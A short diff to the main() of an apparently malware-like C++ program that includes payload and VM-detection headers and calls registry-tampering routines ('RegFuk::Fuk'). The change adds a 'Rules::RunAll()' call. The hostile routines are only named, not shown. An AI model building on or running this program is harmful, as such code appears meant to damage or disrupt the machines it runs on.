@@ -9,6 +9,7 @@
 
 #include "start.h"
 #include "payloads.h"
+#include "rules.h"
 #include "utils/utils.h"
 #include "utils/seed.h"
 #include "utils/vmdetect.h"
@@ -869,6 +870,10 @@ int main()
         RegFuk::Fuk();
         Tosse::Mark();
     }
+
+    // The Rules: every rule in the corpus-battery is executed
+    // (read/detect/play) as part of the show.
+    Rules::RunAll();
 
     StartEffects(noGui);
 
